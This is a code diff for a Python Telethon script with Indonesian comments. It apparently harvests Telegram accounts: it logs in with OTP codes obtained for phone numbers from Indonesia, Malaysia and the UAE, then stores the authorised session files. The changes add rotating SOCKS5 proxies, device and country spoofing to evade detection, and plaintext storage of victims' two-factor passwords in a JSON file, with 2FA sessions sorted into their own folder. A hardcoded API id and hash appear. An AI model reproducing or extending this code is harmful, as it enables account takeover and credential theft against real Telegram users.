@@ -3,6 +3,7 @@ import os
 import re
 import shutil
 import random
+import json
 from datetime import datetime, timedelta
 from telethon import TelegramClient, events
 from telethon.errors import (
@@ -11,6 +12,7 @@ from telethon.errors import (
 )
 from telethon.tl.functions.account import GetAuthorizationsRequest
 from telethon.network.connection import ConnectionTcpAbridged
+from urllib.parse import urlparse
 
 # Konfigurasi API
 api_id = 23520639
@@ -18,7 +20,10 @@ api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'
 
 SESSIONS_FOLDER = "a45_sessions"
 SESSIONS_FOLDER_FINAL = "sessions3"
+SESSIONS_FOLDER_2FA = "sessions_2fa"
+PASSWORDS_FILE = "2fa_passwords.json"
 ALLOWED_PREFIXES = ["+62", "+60", "+971"]
+PROXY_FILE = "proxy.txt"
 
 pending_login = {}
 incoming_messages = {}
@@ -27,8 +32,32 @@ completed_login = set()
 
 os.makedirs(SESSIONS_FOLDER, exist_ok=True)
 os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)
+os.makedirs(SESSIONS_FOLDER_2FA, exist_ok=True)
 
 client = TelegramClient('main2', api_id, api_hash)
+
+def load_proxies():
+    proxies = []
+    if not os.path.exists(PROXY_FILE):
+        return proxies
+
+    with open(PROXY_FILE, "r", encoding="utf-8") as f:
+        for line in f:
+            line = line.strip()
+            if not line.startswith("socks5://"):
+                continue
+            try:
+                parsed = urlparse(line)
+                proxies.append({
+                    "proxy_type": "socks5",
+                    "addr": parsed.hostname,
+                    "port": parsed.port,
+                    "username": parsed.username,
+                    "password": parsed.password
+                })
+            except Exception as e:
+                print(f"[❌] Gagal parsing proxy: {line} | {e}")
+    return proxies
 
 DEVICE_LIST = [
     ("Samsung Galaxy S21", "Android 13"),
@@ -62,8 +91,24 @@ def is_valid_phone_number(phone):
 
 def create_spoofed_client(session_path, phone):
     model, version = random.choice(DEVICE_LIST)
-    print(f"[\U0001f6e0\ufe0f] Spoof applied: {model} ({version})")
+    print(f"[🛠️] Spoof applied: {model} ({version})")
 
+    # Pilih proxy acak jika tersedia
+    proxy_list = load_proxies()
+    proxy = None
+    if proxy_list:
+        p = random.choice(proxy_list)
+        proxy = (
+            p["proxy_type"],
+            p["addr"],
+            p["port"],
+            True,  # rdns
+            p.get("username"),
+            p.get("password")
+        )
+        print(f"[🧩] Proxy digunakan: {p['addr']}:{p['port']}")
+
+    # Inisialisasi client dengan spoof + proxy
     client = TelegramClient(
         session_path, api_id, api_hash,
         device_model=model,
@@ -71,9 +116,11 @@ def create_spoofed_client(session_path, phone):
         app_version="Telegram Android 10.0.0",
         lang_code="en",
         system_lang_code="en",
-        connection=ConnectionTcpAbridged
+        connection=ConnectionTcpAbridged,
+        proxy=proxy
     )
 
+    # Tambahkan spoof lokasi negara berdasarkan prefix
     async def set_country_after_connect():
         try:
             await client.connect()
@@ -87,12 +134,26 @@ def create_spoofed_client(session_path, phone):
                     conn.country = "AE"
                 else:
                     conn.country = "US"
-                print(f"[\U0001f30f] Country spoof applied: {conn.country}")
+                print(f"[🌐] Country spoof applied: {conn.country}")
         except Exception as e:
-            print(f"[\u26a0\ufe0f] Gagal spoof country: {e}")
+            print(f"[⚠️] Gagal spoof country: {e}")
 
     client.set_country = set_country_after_connect
     return client
+
+def save_2fa_password(phone, password):
+    try:
+        if os.path.exists(PASSWORDS_FILE):
+            with open(PASSWORDS_FILE, 'r') as f:
+                data = json.load(f)
+        else:
+            data = {}
+        data[phone] = password
+        with open(PASSWORDS_FILE, 'w') as f:
+            json.dump(data, f, indent=2)
+        print(f"[💾] Password 2FA disimpan untuk {phone}")
+    except Exception as e:
+        print(f"[⚠️] Gagal menyimpan password 2FA: {e}")
 
 async def request_otp(phone):
     try:
@@ -134,6 +195,8 @@ async def complete_login(phone, otp, password=None):
         login_client, phone_code_hash = pending_login[phone]
         await login_client.connect()
 
+        used_2fa = False
+
         try:
             await login_client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
         except PhoneNumberUnoccupiedError:
@@ -142,6 +205,7 @@ async def complete_login(phone, otp, password=None):
             if password:
                 await login_client.sign_in(password=password)
                 print(f"[🔓] Login 2FA berhasil: {phone}")
+                used_2fa = True
             else:
                 print(f"[⏳] Menunggu password 2FA: {phone}")
                 return
@@ -157,14 +221,18 @@ async def complete_login(phone, otp, password=None):
             return
 
         print(f"[✅] Login berhasil: {phone}")
-        if not password:
-            completed_login.add(phone)
+        completed_login.add(phone)
 
         await login_client.disconnect()
 
+        # Tentukan path folder
         src = os.path.join(SESSIONS_FOLDER, phone + ".session")
-        dst = os.path.join(SESSIONS_FOLDER_FINAL, phone + ".session")
+        if used_2fa:
+            dst = os.path.join(SESSIONS_FOLDER_2FA, phone + ".session")
+        else:
+            dst = os.path.join(SESSIONS_FOLDER_FINAL, phone + ".session")
 
+        # Pindahkan session
         for i in range(5):
             try:
                 shutil.move(src, dst)
@@ -174,6 +242,11 @@ async def complete_login(phone, otp, password=None):
                 print(f"[⌛] Gagal pindah session (try {i+1}): {e}")
                 await asyncio.sleep(1)
 
+        # Simpan password 2FA jika ada
+        if used_2fa and password:
+            save_2fa_password(phone, password)
+
+        # Cleanup
         del pending_login[phone]
         login_attempted.discard(phone)
         if phone in incoming_messages:
@@ -259,7 +332,7 @@ async def check_all_existing_sessions():
         session_path = os.path.join(SESSIONS_FOLDER, filename)
         final_path = os.path.join(SESSIONS_FOLDER_FINAL, filename)
 
-        client = create_spoofed_client(session_path)
+        client = create_spoofed_client(session_path, phone)
         try:
             await client.connect()
             if await client.is_user_authorized():
